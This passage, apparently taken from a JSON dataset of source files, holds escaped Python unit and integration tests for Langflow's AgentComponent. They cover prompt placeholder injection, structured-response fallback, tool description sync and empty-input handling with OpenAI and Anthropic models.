\\\"\\\"\\n        assert component._inject_dynamic_prompt_values(None) is None\\n\\n    async def test_should_inject_dynamic_values_into_system_prompt_when_message_response_runs(\\n        self, component_class, default_kwargs\\n    ):\\n        \\\"\\\"\\\"Integration: message_response must call self.set with the resolved system_prompt.\\\"\\\"\\\"\\n        from unittest.mock import AsyncMock, MagicMock\\n\\n        default_kwargs[\\\"system_prompt\\\"] = \\\"Powered by {model_name}.\\\"\\n        default_kwargs[\\\"add_calculator_tool\\\"] = False\\n        default_kwargs[\\\"add_current_date_tool\\\"] = False\\n        component = await self.component_setup(component_class, default_kwargs)\\n        component.model = [{\\\"name\\\": \\\"gpt-4o\\\", \\\"provider\\\": \\\"OpenAI\\\", \\\"metadata\\\": {}}]\\n        component.get_memory_data = AsyncMock(return_value=[])\\n        component._get_shared_callbacks = list\\n        component.set_tools_callbacks = lambda *_: None\\n\\n        captured: dict = {}\\n\\n        def fake_set(**kwargs):\\n            captured.update(kwargs)\\n            return component\\n\\n        component.set = fake_set\\n        component.create_agent_runnable = MagicMock(return_value=MagicMock())\\n        component.run_agent = AsyncMock(return_value=MagicMock())\\n\\n        with patch(\\\"lfx.components.models_and_agents.agent.get_llm\\\") as mock_get_llm:\\n            mock_get_llm.return_value = MockLanguageModel()\\n            await component.message_response()\\n\\n        assert captured.get(\\\"system_prompt\\\") == \\\"Powered by gpt-4o.\\\"\\n\\n    async def test_should_expose_structured_response_output_when_class_loaded(self, component_class):\\n        \\\"\\\"\\\"The Agent must declare a 'structured_response' output wired to json_response().\\\"\\\"\\\"\\n        output_names = {o.name: o for o in component_class.outputs}\\n\\n        assert \\\"structured_response\\\" in output_names, \\\"Agent should expose a structured_response output\\\"\\n        assert output_names[\\\"structured_response\\\"].method == \\\"json_response\\\"\\n        assert \\\"Data\\\" in output_names[\\\"structured_response\\\"].types\\n\\n    async def test_should_not_mutate_format_instructions_when_json_response_runs(self, component_class, default_kwargs):\\n        \\\"\\\"\\\"Regression: injection must only touch agent_instructions, not format_instructions.\\n\\n        Forces the prompt-fallback path (by attaching a tool) so the augmented system\\n        prompt is built and passed to ``set()``. Native structured output does not\\n        concatenate format_instructions because the schema is enforced by the provider.\\n        \\\"\\\"\\\"\\n        from unittest.mock import AsyncMock, MagicMock\\n\\n        default_kwargs[\\\"system_prompt\\\"] = \\\"Powered by {model_name}.\\\"\\n        default_kwargs[\\\"format_instructions\\\"] = \\\"Return JSON with fields {current_date} and {model_name} preserved.\\\"\\n        default_kwargs[\\\"add_calculator_tool\\\"] = False\\n        default_kwargs[\\\"add_current_date_tool\\\"] = False\\n        # Non-empty schema is required to exercise the structured-output path at all.\\n        default_kwargs[\\\"output_schema\\\"] = [\\n            {\\\"name\\\": \\\"answer\\\", \\\"type\\\": \\\"str\\\", \\\"description\\\": \\\"the answer\\\", \\\"multiple\\\": False},\\n        ]\\n        component = await self.component_setup(component_class, default_kwargs)\\n        component.model = [{\\\"name\\\": \\\"gpt-4o\\\", \\\"provider\\\": \\\"OpenAI\\\", \\\"metadata\\\": {}}]\\n        component.get_memory_data = AsyncMock(return_value=[])\\n        component._get_shared_callbacks = list\\n        component.set_tools_callbacks = lambda *_: None\\n        # A non-empty tools list forces the orchestrator into fallback mode (prefer_native=False),\\n        # which is the only path that builds the augmented system prompt asserted below.\\n        fake_tool = MagicMock()\\n        fake_tool.name = \\\"fake_tool\\\"\\n        component.tools = [fake_tool]\\n\\n        captured: dict = {}\\n\\n        def fake_set(**kwargs):\\n            captured.update(kwargs)\\n            return component\\n\\n        component.set = fake_set\\n        component.create_agent_runnable = MagicMock(return_value=MagicMock())\\n        component.run_agent = AsyncMock(return_value=MagicMock(content='{\\\"answer\\\": \\\"42\\\"}'))\\n\\n        with patch(\\\"lfx.components.models_and_agents.agent.get_llm\\\") as mock_get_llm:\\n            mock_get_llm.return_value = MockLanguageModel()\\n            await component.json_response()\\n\\n        prompt = captured.get(\\\"system_prompt\\\") or \\\"\\\"\\n        assert \\\"Powered by gpt-4o.\\\" in prompt, \\\"agent_instructions should have placeholders replaced\\\"\\n        assert \\\"{current_date}\\\" in prompt, \\\"format_instructions literal braces must survive\\\"\\n        assert \\\"{model_name} preserved\\\" in prompt, \\\"format_instructions literal braces must survive\\\"\\n\\n    async def test_should_not_emit_chat_message_when_json_response_uses_fallback(self, component_class, default_kwargs):\\n        \\\"\\\"\\\"Regression: fallback path must not emit a chat message via run_agent's send_message.\\n\\n        Bug: when output_schema is wired to Chat Output and tools are attached, the\\n        playground shows two AI messages with the same JSON. run_agent streams the\\n        agent's final answer through self.send_message (for message_response), and\\n        the orchestrator-returned Data is rendered separately by the downstream\\n        Chat Output. In the structured-response flow, only the latter should reach\\n        the playground.\\n        \\\"\\\"\\\"\\n        from unittest.mock import AsyncMock, MagicMock\\n\\n        from lfx.schema.message import Message\\n\\n        default_kwargs[\\\"add_calculator_tool\\\"] = False\\n        default_kwargs[\\\"add_current_date_tool\\\"] = False\\n        default_kwargs[\\\"output_schema\\\"] = [\\n            {\\\"name\\\": \\\"answer\\\", \\\"type\\\": \\\"str\\\", \\\"description\\\": \\\"the answer\\\", \\\"multiple\\\": False},\\n        ]\\n        component = await self.component_setup(component_class, default_kwargs)\\n        component.model = [{\\\"name\\\": \\\"gpt-4o\\\", \\\"provider\\\": \\\"OpenAI\\\", \\\"metadata\\\": {}}]\\n        component.get_memory_data = AsyncMock(return_value=[])\\n        component._get_shared_callbacks = list\\n        component.set_tools_callbacks = lambda *_: None\\n        # A non-empty tools list forces the orchestrator into fallback mode\\n        # (prefer_native=False), which is the path that triggers the duplication.\\n        fake_tool = MagicMock()\\n        fake_tool.name = \\\"fake_tool\\\"\\n        component.tools = [fake_tool]\\n\\n        component.set = MagicMock(return_value=component)\\n        component.create_agent_runnable = MagicMock(return_value=MagicMock())\\n\\n        chat_emissions: list[Message] = []\\n\\n        async def tracked_send_message(message, *_args, **_kwargs):\\n            chat_emissions.append(message)\\n            return message\\n\\n        component.send_message = tracked_send_message\\n\\n        # Reproduce production run_agent's side-effect: it streams the final\\n        # message through self.send_message. The fix must intercept this so the\\n        # fallback's intermediate output never reaches the playground.\\n        async def fake_run_agent(_agent_runnable):\\n            emitted = Message(text='{\\\"answer\\\": \\\"42\\\"}')\\n            await component.send_message(emitted)\\n            return emitted\\n\\n        component.run_agent = fake_run_agent\\n\\n        with patch(\\\"lfx.components.models_and_agents.agent.get_llm\\\") as mock_get_llm:\\n            mock_get_llm.return_value = MockLanguageModel()\\n            await component.json_response()\\n\\n        assert chat_emissions == [], (\\n            \\\"Fallback path must suppress run_agent's chat-message emission \u2014 the \\\"\\n            \\\"Chat Output downstream renders the structured Data. \\\"\\n            f\\\"Got {len(chat_emissions)} emission(s).\\\"\\n        )\\n\\n    async def test_should_restore_send_message_when_run_agent_raises_in_fallback(self, component_class, default_kwargs):\\n        \\\"\\\"\\\"Durability anchor: send_message suppression during fallback must be scoped.\\n\\n        Even when run_agent raises, the original method must be restored on the component\\n        instance. Otherwise a later message_response call would silently swallow chat\\n        emissions.\\n        \\\"\\\"\\\"\\n        from unittest.mock import AsyncMock, MagicMock\\n\\n        default_kwargs[\\\"add_calculator_tool\\\"] = False\\n        default_kwargs[\\\"add_current_date_tool\\\"] = False\\n        default_kwargs[\\\"output_schema\\\"] = [\\n            {\\\"name\\\": \\\"answer\\\", \\\"type\\\": \\\"str\\\", \\\"description\\\": \\\"the answer\\\", \\\"multiple\\\": False},\\n        ]\\n        component = await self.component_setup(component_class, default_kwargs)\\n        component.model = [{\\\"name\\\": \\\"gpt-4o\\\", \\\"provider\\\": \\\"OpenAI\\\", \\\"metadata\\\": {}}]\\n        component.get_memory_data = AsyncMock(return_value=[])\\n        component._get_shared_callbacks = list\\n        component.set_tools_callbacks = lambda *_: None\\n        # Force fallback path via attached tools (prefer_native=False).\\n        fake_tool = MagicMock()\\n        fake_tool.name = \\\"fake_tool\\\"\\n        component.tools = [fake_tool]\\n        component.set = MagicMock(return_value=component)\\n        component.create_agent_runnable = MagicMock(return_value=MagicMock())\\n\\n        # Install a known sentinel so we can identity-check it after json_response.\\n        # (Default `component.send_message` is a bound method recreated on every access,\\n        # which would defeat an `is` assertion.)\\n        post_emissions: list[Any] = []\\n\\n        async def sentinel_send_message(message, *_args, **_kwargs):\\n            post_emissions.append(message)\\n            return message\\n\\n        component.send_message = sentinel_send_message\\n\\n        async def exploding_run_agent(_runnable):\\n            msg = \\\"boom\\\"\\n            raise ValueError(msg)\\n\\n        component.run_agent = exploding_run_agent\\n\\n        with patch(\\\"lfx.components.models_and_agents.agent.get_llm\\\") as mock_get_llm:\\n            mock_get_llm.return_value = MockLanguageModel()\\n            # json_response handles the exception internally and returns an error Data,\\n            # so the exception is swallowed gracefully \u2014 but the swap must already be undone.\\n            await component.json_response()\\n\\n        assert component.send_message is sentinel_send_message, (\\n            \\\"send_message must be restored on the component even when run_agent raises; \\\"\\n            \\\"otherwise a subsequent message_response would silently drop chat emissions.\\\"\\n        )\\n        # And the restored function must actually be callable as send_message.\\n        from lfx.schema.message import Message\\n\\n        await component.send_message(Message(text=\\\"post-fallback\\\"))\\n        assert len(post_emissions) == 1\\n\\n    async def test_should_accept_add_calculator_tool_in_default_keys(self, component_class, default_kwargs):\\n        \\\"\\\"\\\"update_build_config's default_keys validation must include add_calculator_tool.\\\"\\\"\\\"\\n        from lfx.schema.dotdict import dotdict\\n\\n        with patch(\\\"lfx.components.models_and_agents.agent.get_language_model_options\\\") as mock_opts:\\n            mock_opts.return_value = [\\n                {\\n                    \\\"name\\\": \\\"gpt-4o\\\",\\n                    \\\"provider\\\": \\\"OpenAI\\\",\\n                    \\\"icon\\\": \\\"OpenAI\\\",\\n                    \\\"metadata\\\": {\\n                        \\\"model_class\\\": \\\"ChatOpenAI\\\",\\n                        \\\"model_name_param\\\": \\\"model\\\",\\n                        \\\"api_key_param\\\": \\\"api_key\\\",\\n                    },\\n                }\\n            ]\\n            component = await self.component_setup(component_class, default_kwargs)\\n            frontend_node = component.to_frontend_node()\\n            build_config = frontend_node[\\\"data\\\"][\\\"node\\\"][\\\"template\\\"]\\n\\n            # add_calculator_tool must be present in the build_config already; if not,\\n            # update_build_config will error listing it as missing.\\n            assert \\\"add_calculator_tool\\\" in build_config\\n\\n            updated_config = await component.update_build_config(\\n                dotdict(build_config), mock_opts.return_value, field_name=\\\"model\\\"\\n            )\\n            assert \\\"add_calculator_tool\\\" in updated_config\\n\\n    def test_should_have_placeholders_in_default_system_prompt(self, component_class):\\n        \\\"\\\"\\\"Default system_prompt ships with placeholders for the dynamic injection.\\n\\n        Ensures {current_date} and {model_name} are visible on a fresh agent so\\n        that the dynamic injection has an observable effect out-of-the-box.\\n        \\\"\\\"\\\"\\n        prompt_input = next(\\n            (inp for inp in component_class.inputs if getattr(inp, \\\"name\\\", None) == \\\"system_prompt\\\"),\\n            None,\\n        )\\n        assert prompt_input is not None\\n        assert \\\"{current_date}\\\" in prompt_input.value\\n        assert \\\"{model_name}\\\" in prompt_input.value\\n\\n    async def test_should_keep_description_in_sync_when_agent_used_as_tool(self, component_class, default_kwargs):\\n        \\\"\\\"\\\"Regression for GitHub issue #9155.\\n\\n        When an Agent is exposed as a tool, the deprecated agent_description\\n        override made the generated tool's ``description`` diverge from\\n        ``display_description`` on the very first build. That divergence made the\\n        merge logic in ``_build_tools_metadata_input()`` permanently treat the\\n        description as a user customization, so later changes to the agent's\\n        description never reached the parent agent's Actions panel.\\n\\n        Invariant under test: on the first build, a non-user-edited\\n        agent-as-tool entry must have ``description == display_description``,\\n        exactly like regular tool components.\\n        \\\"\\\"\\\"\\n        component = await self.component_setup(component_class, default_kwargs)\\n\\n        await component._build_tools_metadata_input()\\n\\n        metadata = component.tools_metadata\\n        assert metadata, \\\"Agent-as-tool should produce at least one tool entry\\\"\\n        for item in metadata:\\n            assert item[\\\"description\\\"] == item[\\\"display_description\\\"], (\\n                \\\"Agent-as-tool description diverged from display_description on \\\"\\n                f\\\"first build (issue #9155): {item['description']!r} != {item['display_description']!r}\\\"\\n            )\\n\\n    async def test_should_propagate_description_change_when_agent_used_as_tool(self, component_class, default_kwargs):\\n        \\\"\\\"\\\"Regression for GitHub issue #9155 (user-visible symptom).\\n\\n        A change to the child agent's tool description must reach the parent\\n        agent's Actions panel on the next build, as long as the user did not\\n        manually customize it in the panel.\\n        \\\"\\\"\\\"\\n        component = await self.component_setup(component_class, default_kwargs)\\n\\n        await component._build_tools_metadata_input()\\n        first_description = component.tools_metadata[0][\\\"description\\\"]\\n\\n        # Simulate the child agent's description changing (e.g. component.description),\\n        # then the parent re-reading the tool. The new value must propagate.\\n        component.description = \\\"An updated agent description\\\"\\n        await component._build_tools_metadata_input()\\n        second_description = component.tools_metadata[0][\\\"description\\\"]\\n\\n        assert second_description != first_description, (\\n            \\\"Description change on the child agent was not propagated to the \\\"\\n            f\\\"Actions panel (issue #9155): still {second_description!r}\\\"\\n        )\\n        assert \\\"An updated agent description\\\" in second_description\\n\\n    async def test_update_build_config_does_not_require_deprecated_agent_description(\\n        self, component_class, default_kwargs\\n    ):\\n        \\\"\\\"\\\"Regression for PR #13151 review (P0).\\n\\n        The deprecated ``agent_description`` input was removed from the agent\\n        template. The concrete ``AgentComponent`` must no longer list it in the\\n        ``update_build_config`` ``default_keys``, otherwise a model refresh\\n        raises ``ValueError: Missing required keys`` because the key is gone\\n        from the generated template.\\n        \\\"\\\"\\\"\\n        from lfx.schema.dotdict import dotdict\\n\\n        with patch(\\\"lfx.components.models_and_agents.agent.get_language_model_options\\\") as mock_opts:\\n            mock_opts.return_value = [\\n                {\\n                    \\\"name\\\": \\\"gpt-4o\\\",\\n                    \\\"provider\\\": \\\"OpenAI\\\",\\n                    \\\"icon\\\": \\\"OpenAI\\\",\\n                    \\\"metadata\\\": {\\n                        \\\"model_class\\\": \\\"ChatOpenAI\\\",\\n                        \\\"model_name_param\\\": \\\"model\\\",\\n                        \\\"api_key_param\\\": \\\"api_key\\\",\\n                    },\\n                }\\n            ]\\n            component = await self.component_setup(component_class, default_kwargs)\\n            frontend_node = component.to_frontend_node()\\n            build_config = frontend_node[\\\"data\\\"][\\\"node\\\"][\\\"template\\\"]\\n\\n            assert \\\"agent_description\\\" not in build_config, (\\n                \\\"Deprecated agent_description must not be present in the agent template\\\"\\n            )\\n\\n            # Must not raise \\\"Missing required keys in build_config\\\".\\n            updated_config = await component.update_build_config(\\n                dotdict(build_config), mock_opts.return_value, field_name=\\\"model\\\"\\n            )\\n\\n        assert \\\"agent_description\\\" not in updated_config\\n\\n    async def test_get_tools_does_not_call_removed_api(self, component_class, default_kwargs):\\n        \\\"\\\"\\\"Regression for PR #13151 review (P0).\\n\\n        The concrete ``AgentComponent._get_tools()`` used to call the removed\\n        ``get_tool_description()`` for a tool-description override. Building the\\n        agent-as-tool must not raise ``AttributeError`` and must succeed.\\n        \\\"\\\"\\\"\\n        component = await self.component_setup(component_class, default_kwargs)\\n\\n        tools = await component._get_tools()\\n\\n        assert tools, \\\"Agent-as-tool must still produce at least one tool\\\"\\n\\n    async def test_get_tool_description_backward_compat_shim(self, component_class, default_kwargs):\\n        \\\"\\\"\\\"Regression for PR #13151 review (P1).\\n\\n        Flows serialized with the pre-deprecation component code still call\\n        ``self.get_tool_description()``. The base class must keep this shim so\\n        those flows stay loadable: it returns the default when no\\n        ``agent_description`` is set, and the old value when an old serialized\\n        component still defines and sets it.\\n        \\\"\\\"\\\"\\n        from lfx.base.agents.agent import DEFAULT_TOOLS_DESCRIPTION\\n\\n        component = await self.component_setup(component_class, default_kwargs)\\n\\n        # New components have no agent_description -> falls back to the default.\\n        assert component.get_tool_description() == DEFAULT_TOOLS_DESCRIPTION\\n\\n        # Old serialized component code defines its own agent_description input\\n        # and sets it; the shim must surface that value unchanged.\\n        component.agent_description = \\\"Legacy serialized description\\\"\\n        assert component.get_tool_description() == \\\"Legacy serialized description\\\"\\n\\n\\nclass TestAgentComponentWithClient(ComponentTestBaseWithClient):\\n    @pytest.fixture\\n    def component_class(self):\\n        return AgentComponent\\n\\n    @pytest.fixture\\n    def file_names_mapping(self):\\n        return []\\n\\n    @pytest.mark.api_key_required\\n    @pytest.mark.no_blockbuster\\n    async def test_agent_component_with_calculator(self):\\n        # Now you can access the environment variables\\n        from tests.api_keys import get_openai_api_key\\n\\n        api_key = get_openai_api_key()\\n        tools = [CalculatorToolComponent().build_tool()]  # Use the Calculator component as a tool\\n        input_value = \\\"What is 2 + 2?\\\"\\n\\n        temperature = 0.1\\n\\n        # Initialize the AgentComponent with mocked inputs\\n        agent = AgentComponent(\\n            tools=tools,\\n            input_value=input_value,\\n            api_key=api_key,\\n            model=[\\n                {\\n                    \\\"name\\\": \\\"gpt-4o\\\",\\n                    \\\"provider\\\": \\\"OpenAI\\\",\\n                    \\\"icon\\\": \\\"OpenAI\\\",\\n                    \\\"metadata\\\": {\\n                        \\\"model_class\\\": \\\"ChatOpenAI\\\",\\n                        \\\"model_name_param\\\": \\\"model\\\",\\n                        \\\"api_key_param\\\": \\\"api_key\\\",\\n                    },\\n                }\\n            ],\\n            temperature=temperature,\\n            _session_id=str(uuid4()),\\n        )\\n\\n        response = await agent.message_response()\\n        assert \\\"4\\\" in response.data.get(\\\"text\\\")\\n\\n    @pytest.mark.api_key_required\\n    @pytest.mark.no_blockbuster\\n    async def test_agent_component_with_all_openai_models(self):\\n        # Mock inputs\\n        from tests.api_keys import get_openai_api_key\\n\\n        api_key = get_openai_api_key()\\n        input_value = \\\"What is 2 + 2?\\\"\\n\\n        # Iterate over all OpenAI models\\n        failed_models = []\\n        for model_name in OPENAI_CHAT_MODEL_NAMES + OPENAI_REASONING_MODEL_NAMES:\\n            # Initialize the AgentComponent with mocked inputs\\n            tools = [CalculatorToolComponent().build_tool()]  # Use the Calculator component as a tool\\n            agent = AgentComponent(\\n                tools=tools,\\n                input_value=input_value,\\n                api_key=api_key,\\n                model=[\\n                    {\\n                        \\\"name\\\": model_name,\\n                        \\\"provider\\\": \\\"OpenAI\\\",\\n                        \\\"icon\\\": \\\"OpenAI\\\",\\n                        \\\"metadata\\\": {\\n                            \\\"model_class\\\": \\\"ChatOpenAI\\\",\\n                            \\\"model_name_param\\\": \\\"model\\\",\\n                            \\\"api_key_param\\\": \\\"api_key\\\",\\n                        },\\n                    }\\n                ],\\n                _session_id=str(uuid4()),\\n            )\\n\\n            response = await agent.message_response()\\n            if \\\"4\\\" not in response.data.get(\\\"text\\\"):\\n                failed_models.append(model_name)\\n\\n        assert not failed_models, f\\\"The following models failed the test: {failed_models}\\\"\\n\\n    @pytest.mark.api_key_required\\n    @pytest.mark.no_blockbuster\\n    async def test_agent_component_with_all_anthropic_models(self):\\n        # Mock inputs\\n        api_key = os.getenv(\\\"ANTHROPIC_API_KEY\\\")\\n        input_value = \\\"What is 2 + 2?\\\"\\n\\n        # Iterate over all Anthropic models\\n        failed_models = {}\\n\\n        for model_name in ANTHROPIC_MODELS:\\n            try:\\n                # Initialize the AgentComponent with mocked inputs\\n                tools = [CalculatorToolComponent().build_tool()]\\n                agent = AgentComponent(\\n                    tools=tools,\\n                    input_value=input_value,\\n                    api_key=api_key,\\n                    model=[\\n                        {\\n                            \\\"name\\\": model_name,\\n                            \\\"provider\\\": \\\"Anthropic\\\",\\n                            \\\"icon\\\": \\\"Anthropic\\\",\\n                            \\\"metadata\\\": {\\n                                \\\"model_class\\\": \\\"ChatAnthropic\\\",\\n                                \\\"model_name_param\\\": \\\"model\\\",\\n                                \\\"api_key_param\\\": \\\"api_key\\\",\\n                            },\\n                        }\\n                    ],\\n                    _session_id=str(uuid4()),\\n                )\\n\\n                response = await agent.message_response()\\n                response_text = response.data.get(\\\"text\\\", \\\"\\\")\\n\\n                if \\\"4\\\" not in response_text:\\n                    failed_models[model_name] = f\\\"Expected '4' in response but got: {response_text}\\\"\\n            except Exception as e:\\n                failed_models[model_name] = f\\\"Exception occurred: {e!s}\\\"\\n\\n            try:\\n                # Test with empty string input\\n                tools = [CalculatorToolComponent().build_tool()]\\n                agent = AgentComponent(\\n                    tools=tools,\\n                    input_value=\\\" \\\",\\n                    api_key=api_key,\\n                    model=[\\n                        {\\n                            \\\"name\\\": model_name,\\n                            \\\"provider\\\": \\\"Anthropic\\\",\\n                            \\\"icon\\\": \\\"Anthropic\\\",\\n                            \\\"metadata\\\": {\\n                                \\\"model_class\\\": \\\"ChatAnthropic\\\",\\n                                \\\"model_name_param\\\": \\\"model\\\",\\n                                \\\"api_key_param\\\": \\\"api_key\\\",\\n                            },\\n                        }\\n                    ],\\n                    _session_id=str(uuid4()),\\n                )\\n\\n                response = await agent.message_response()\\n                response_text = response.data.get(\\\"text\\\", \\\"\\\")\\n\\n            except Exception as e:\\n                failed_models[model_name] = f\\\"Exception occurred: {e!s}\\\"\\n\\n        assert not failed_models, \\\"The following models failed the test:\\\\n\\\" + \\\"\\\\n\\\".join(\\n            f\\\"{model}: {error}\\\" for model, error in failed_models.items()\\n        )\\n\\n    @pytest.mark.api_key_required\\n    @pytest.mark.no_blockbuster\\n    async def test_agent_handles_empty_input_with_openai(self):\\n        \\\"\\\"\\\"Test that Agent component handles empty input value without errors with OpenAI.\\\"\\\"\\\"\\n        api_key = os.getenv(\\\"OPENAI_API_KEY\\\")\\n        tools = [CalculatorToolComponent().build_tool()]\\n\\n        # Test with empty string input\\n        agent = AgentComponent(\\n            tools=tools,\\n            input_value=\\\"\\\",\\n            api_key=api_key,\\n            model=[\\n                {\\n                    \\\"name\\\": \\\"gpt-4o\\\",\\n                    \\\"provider\\\": \\\"OpenAI\\\",\\n                    \\\"icon\\\": \\\"OpenAI\\\",\\n                    \\\"metadata\\\": {\\n                        \\\"model_class\\\": \\\"ChatOpenAI\\\",\\n                        \\\"model_name_param\\\": \\\"model\\\",\\n                        \\\"api_key_param\\\": \\\"api_key\\\",\\n                    },\\n                }\\n            ],\\n            temperature=0.1,\\n            _session_id=str(uuid4()),\\n        )\\n\\n        # This should not raise an error - the agent should provide a default input\\n        response = await agent.message_response()\\n        assert response is not None\\n        assert hasattr(response, \\\"text\\\") or hasattr(response, \\\"data\\\")\\n\\n    @pytest.mark.api_key_required\\n    @pytest.mark.no_blockbuster\\n    async def test_agent_handles_whitespace_input_with_openai(self):\\n        \\\"\\\"\\\"Test that Agent component handles whitespace-only input without errors with OpenAI.\\\"\\\"\\\"\\n        api_key = os.getenv(\\\"OPENAI_API_KEY\\\")\\n        tools = [CalculatorToolComponent().build_tool()]\\n\\n        # Test with whitespace-only input\\n        agent = AgentComponent(\\n            tools=tools,\\n            input_value=\\\"   \\\\n\\\\t  \\\",\\n            api_key=api_key,\\n            model=[\\n                {\\n                    \\\"name\\\": \\\"gpt-4o\\\",\\n                    \\\"provider\\\": \\\"OpenAI\\\",\\n                    \\\"icon\\\": \\\"OpenAI\\\",\\n                    \\\"metadata\\\": {\\n                        \\\"model_class\\\": \\\"ChatOpenAI\\\",\\n                        \\\"model_name_param\\\": \\\"model\\\",\\n                        \\\"api_key_param\\\": \\\"api_key\\\",\\n                    },\\n                }\\n            ],\\n            temperature=0.1,\\n            _session_id=str(uuid4()),\\n        )\\n\\n        # This should not raise an error - the agent should provide a default input\\n        response = await agent.message_response()\\n        assert response is not None\\n        assert hasattr(response, \\\"text\\\") or hasattr(response, \\\"data\\\")\\n\\n    @pytest.mark.api_key_required\\n    @pytest.mark.no_blockbuster\\n    async def test_agent_receives_string_from_message_object_with_openai(self):\\n        \\\"\\\"\\\"Test that agent receives string input from Message object with actual OpenAI call.\\n\\n        This test verifies the fix for the issue where agents were receiving:\\n        content='hi how are you' additional_kwargs={} response_metadata={}\\n        instead of just the string 'hi how are you'.\\n        \\\"\\\"\\\"\\n        api_key = os.getenv(\\\"OPENAI_API_KEY\\\")\\n        from lfx.schema.message import Message\\n\\n        # Create a Message object as input (simulating ChatInput component output)\\n        message_input = Message(text=\\\"What is 5 + 3?\\\", sender=\\\"User\\\", sender_name=\\\"User\\\")\\n\\n        tools = [CalculatorToolComponent().build_tool()]\\n        agent = AgentComponent(\\n            tools=tools,\\n            input_value=message_input,  # Pass Message object, not string\\n            api_key=api_key,\\n            model_name=\\\"gpt-4o\\\",\\n            agent_llm=\\\"OpenAI\\\",\\n            temperature=0.1,\\n            _session_id=str(uuid4()),\\n        )\\n\\n        # This should work correctly - the agent should extract text from the Message\\n        response = await agent.message_response()\\n        assert response is not None\\n        assert \\\"8\\\" in response.data.get(\\\"text\\\", \\\"\\\")\\n\\n    @pytest.mark.api_key_required\\n    @pytest.mark.no_blockbuster\\n    async def test_agent_receives_string_from_message_object_with_anthropic(self):\\n        \\\"\\\"\\\"Test that agent receives string input from Message object with actual Anthropic call.\\\"\\\"\\\"\\n        api_key = os.getenv(\\\"ANTHROPIC_API_KEY\\\")\\n        from lfx.base.models.anthropic_constants import ANTHROPIC_MODELS_DETAILED\\n        from lfx.schema.message import Message\\n\\n        # Create a Message object as input (simulating ChatInput component output)\\n        message_input = Message(text=\\\"What is 7 + 2?\\\", sender=\\\"User\\\", sender_name=\\\"User\\\")\\n\\n        tools = [CalculatorToolComponent().build_tool()]\\n        agent = AgentComponent(\\n            tools=tools,\\n            input_value=message_input,  # Pass Message object, not string\\n            api_key=api_key,\\n            model_name=ANTHROPIC_MODELS_DETAILED[0][\\\"name\\\"],\\n            agent_llm=\\\"Anthropic\\\",\\n            _session_id=str(uuid4()),\\n        )\\n\\n        # This should work correctly - the agent should extract text from the Message\\n        response = await agent.message_response()\\n        assert response is not None\\n        assert \\\"9\\\" in response.data.get(\\\"text\\\", \\\"\\\")\\n\\n    @pytest.mark.api_key_required\\n    @pytest.mark.no_blockbuster\\n    async def test_agent_handles_empty_input_with_anthropic(self):\\n        \\\"\\\"\\\"Test that Agent component handles empty input value without errors with Anthropic.\\n\\n        This test specifically addresses the issue:\\n        'messages.2: all messages must have non-empty content'\\n        \\\"\\\"\\\"\\n        api_key = os.getenv(\\\"ANTHROPIC_API_KEY\\\")\\n        tools = [CalculatorToolComponent().build_tool()]\\n\\n        # Test with empty string input - this previously caused the error\\n        agent = AgentComponent(\\n            tools=tools,\\n            input_value=\\\"\\\",\\n            api_key=api_key,\\n            model=[\\n                {\\n                    \\\"name\\\": \\\"claude-3-5-sonnet-20241022\\\",\\n                    \\\"provider\\\": \\\"Anthropic\\\",\\n                    \\\"icon\\\": \\\"Anthropic\\\",\\n                    \\\"metadata\\\": {\\n                        \\\"model_class\\\": \\\"ChatAnthropic\\\",\\n                        \\\"model_name_param\\\": \\\"model\\\",\\n                        \\\"api_key_param\\\": \\\"api_key\\\",\\n                    },\\n                }\\n            ],\\n            _session_id=str(uuid4()),\\n        )\\n\\n        # This should not raise the \\\"messages.2: all messages must have non-empty content\\\" error\\n        try:\\n            response = await agent.message_response()\\n            assert response is not None\\n            assert hasattr(response, \\\"text\\\") or hasattr(response, \\\"data\\\")\\n        except Exception as e:\\n            # If an error occurs, make sure it's NOT the empty content error\\n            error_message = str(e)\\n            assert \\\"messages.2\\\" not in error_message, f\\\"Empty content error still occurs: {error_message}\\\"\\n            assert \\\"must have non-empty content\\\" not in error_message, (\\n                f\\\"Empty content error still occurs: {error_message}\\\"\\n            )\\n            # Re-raise if it's a different error\\n            raise\\n\\n    @pytest.mark.api_key_required\\n    @pytest.mark.no_blockbuster\\n    async def test_agent_handles_whitespace_input_with_anthropic(self):\\n        \\\"\\\"\\\"Test that Agent component handles whitespace-only input without errors with Anthropic.\\\"\\\"\\\"\\n        api_key = os.getenv(\\\"ANTHROPIC_API_KEY\\\")\\n        tools = [CalculatorToolComponent().build_tool()]\\n        from lfx.base.models.anthropic_constants import ANTHROPIC_MODELS_DETAILED\\n\\n        # Test with whitespace-only input\\n        agent = AgentComponent(\\n            tools=tools,\\n            input_value=\\\"   \\\\n\\\\t  \\\",\\n            api_key=api_key,\\n            model=[\\n                {\\n                    \\\"name\\\": ANTHROPIC_MODELS_DETAILED[0][\\\"name\\\"],\\n                    \\\"provider\\\": \\\"Anthropic\\\",\\n                    \\\"icon\\\": \\\"Anthropic\\\",\\n                    \\\"metadata\\\": {\\n                        \\\"model_class\\\": \\\"ChatAnthropic\\\",\\n                        \\\"model_name_param\\\": \\\"model\\\",\\n                        \\\"api_key_param\\\": \\\"api_key\\\",\\n                    },\\n                }\\n            ],\\n            _session_id=str(uuid4()),\\n        )\\n\\n        # This should not raise the \\\"messages.2: all messages must have non-empty content\\\" error\\n        try:\\n            response = await agent.message_response()\\n            assert response is not None\\n            assert hasattr(response, \\\"text\\\") or hasattr(response, \\\"data\\\")\\n        except Exception as e:\\n            # If an error occurs, make sure it's NOT the empty content error\\n            error_message = str(e)\\n            assert \\\"messages.2\\\" not in error_message, f\\\"Empty content error still occurs: {error_message}\\\"\\n            assert \\\"must have non-empty content\\\" not in error_message, (\\n                f\\\"Empty content error still occurs: {error_message}\\\"\\n            )\\n            # Re-raise if it's a different error\\n            raise\\n\"},{\"record_type\":\"third_party_source_reference\",\"source_repository\":\"langflow-main\",\"source_path\":\"src/backend/tests/unit/components/models_and_agents/test_agent_events.py\",\"source_license\":\"MIT\",\"trust\":\"untrusted_reference_only\",\"retrieval_policy\":\"internal_reference_only\",\"source_sha256\":\"14b07c54651f685f0353f23a4f3c4f89db8f551994e3cc8e15cdb5f297520b3c\",\"content\":\"from collections.abc import AsyncIterator\\nfrom typing import Any\\nfrom unittest.mock import AsyncMock\\n\\nimport pytest\\nfrom langchain_core.agents import AgentFinish\\nfrom langchain_core.messages import AIMessage, AIMessageChunk\\nfrom lfx.base.agents.events import (\\n    _extract_output_text,\\n    handle_on_chain_end,\\n    handle_on_chain_start,\\n    handle_on_chain_stream,\\n    handle_on_tool_end,\\n    handle_on_tool_error,\\n    